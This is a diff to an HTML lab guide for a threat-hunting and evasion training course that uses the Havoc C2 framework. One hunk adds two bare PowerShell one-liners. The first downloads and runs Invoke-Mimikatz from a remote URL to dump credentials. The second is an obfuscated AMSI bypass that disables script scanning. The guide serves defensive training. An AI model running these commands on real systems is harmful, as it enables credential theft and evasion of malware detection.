@@ -154,7 +154,7 @@
 <p><img src="./images/cr_hackers.jpg" alt="image" /></p>
 <p>Welcome to the <strong>&quot;Threathunting Academy - Evasion&quot;</strong>  this is the official lab guide that will guide you through the infrastructure. Students will all have their own <strong>Windows 10 client machine</strong>, a shared central <code>Domain Controller</code> and a Kali <code>Red Team server and Forensics machine</code>. All logs are centrally collected on and Ubuntu server running Elasticsearch and Kibana.</p>
 <h1><a class="header" href="#havoc-c2" id="havoc-c2">Havoc C2</a></h1>
-<p>With a phletora of attack frameworks available (https://howto.thec2matrix.com), the most important requirement is <em>malleability/customizability</em>. Commonly known frameworks such as <code>metasploit</code>, <code>cobalt strike</code>, <code>Empire</code> (Sartkiller GUI), <code>Mythic C2</code> and <code>sliver</code> come to mind. In this training we'll be using a rather new, cobalt strike like framework called <code>Havoc C2</code>.</p>
+<p>With a phletora of attack frameworks available (https://howto.thec2matrix.com), the most important requirement is <em>malleability/customizability</em>. Commonly known frameworks such as <code>metasploit</code>, <code>cobalt strike</code>, <code>Empire</code> (Starkiller GUI), <code>BruteRatel</code>, <code>Mythic C2</code>, <code>covenant</code> and <code>sliver</code> come to mind. In this training we'll be using a rather new, cobalt strike like framework called <code>Havoc C2</code>.</p>
 <p><img src="./images/havoc.jpg" alt="Screenshot" /></p>
 <p><a href="https://github.com/HavocFramework/Havoc?tab=readme-ov-file">https://github.com/HavocFramework/Havoc?tab=readme-ov-file</a></p>
 <p>Attack frameworks typically all consist of the following elements</p>
@@ -797,6 +797,8 @@ File Type: EXECUTABLE IMAGE
                          504 RtlVirtualUnwind
                          ...
 </code></pre>
+<p>IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;</p>
+<p>$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils';$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m));$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');$field.SetValue($null,$true)</p>
 <h1><a class="header" href="#chapter-121---functions" id="chapter-121---functions">Chapter 1.2.1 - Functions</a></h1>
 <p>learn.micorosoft.com</p>
 <p><img src="./images/function_flow.jpg" alt="Screenshot" /></p>
